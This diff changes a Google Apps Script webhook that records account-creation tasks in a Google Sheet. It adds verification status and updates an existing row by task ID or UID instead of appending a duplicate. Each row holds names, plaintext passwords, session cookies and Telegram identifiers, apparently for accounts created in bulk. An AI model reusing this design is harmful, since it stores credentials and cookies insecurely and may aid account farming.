@@ -65,33 +65,72 @@ function doPost(e) {
     }
 
     var contents = e.postData.contents;
-    var data = JSON.parse(contents);
+    var payload = JSON.parse(contents);
+    var data = payload.data || payload;
 
     var now = new Date();
     var formattedDate = Utilities.formatDate(now, "Europe/Paris", "yyyy-MM-dd HH:mm:ss");
 
-    var row = [
+    var taskId = String(data.id || payload.id || "").trim();
+    var uid = String(data.uid || payload.uid || "").trim();
+    var statusText = data.status || "compte créé";
+    if (data.accountStatus && data.accountStatus !== "pending_verification") {
+      statusText = (data.accountStatus === "verified" ? "VERIFIE" : "SUSPENDU") + " (" + statusText + ")";
+    }
+
+    var rowValues = [
       formattedDate,
-      data.id || "task-" + now.getTime(),
-      data.status || "compte créé",
-      "'" + (data.uid || ""), // Force en chaîne pour préserver les zéros initiaux
+      taskId || ("task-" + now.getTime()),
+      statusText,
+      "'" + uid, // Force en chaîne pour préserver les zéros initiaux
       data.firstName || "",
       data.lastName || "",
       data.password || "",
       data.cookies || "",
       "'" + (data.telegramUserId || ""),
       "@" + (data.telegramUsername || "").replace("@", ""),
-      data.notes || ""
+      data.notes || data.verificationReason || ""
     ];
 
-    sheet.appendRow(row);
+    // Recherche de ligne existante par ID Tâche (colonne 2) ou UID (colonne 4) pour éviter les doublons
+    var lastRow = sheet.getLastRow();
+    var existingRowIndex = -1;
 
-    return ContentService.createTextOutput(JSON.stringify({
-      status: "success",
-      message: "Tâche enregistrée avec succès dans Google Sheets",
-      rowNumber: sheet.getLastRow(),
-      uid: data.uid
-    })).setMimeType(ContentService.MimeType.JSON);
+    if (lastRow > 1 && (taskId || uid)) {
+      var existingData = sheet.getRange(2, 1, lastRow - 1, 4).getValues();
+      for (var i = 0; i < existingData.length; i++) {
+        var rowTaskId = String(existingData[i][1]).trim();
+        var rowUid = String(existingData[i][3]).replace(/^'/, '').trim();
+        if ((taskId && rowTaskId === taskId) || (uid && rowUid === uid)) {
+          existingRowIndex = i + 2; // Conversion en index de ligne 1-based dans la feuille
+          break;
+        }
+      }
+    }
+
+    if (existingRowIndex > 0) {
+      // Met à jour la ligne existante sans créer de doublon
+      sheet.getRange(existingRowIndex, 1, 1, rowValues.length).setValues([rowValues]);
+      return ContentService.createTextOutput(JSON.stringify({
+        status: "success",
+        action: "updated",
+        message: "Ligne existante mise à jour avec succès (par ID de tâche)",
+        rowNumber: existingRowIndex,
+        taskId: taskId,
+        uid: uid
+      })).setMimeType(ContentService.MimeType.JSON);
+    } else {
+      // Nouvelle tâche : insertion d'une nouvelle ligne
+      sheet.appendRow(rowValues);
+      return ContentService.createTextOutput(JSON.stringify({
+        status: "success",
+        action: "inserted",
+        message: "Nouvelle tâche enregistrée avec succès dans Google Sheets",
+        rowNumber: sheet.getLastRow(),
+        taskId: taskId,
+        uid: uid
+      })).setMimeType(ContentService.MimeType.JSON);
+    }
 
   } catch (error) {
     return ContentService.createTextOutput(JSON.stringify({
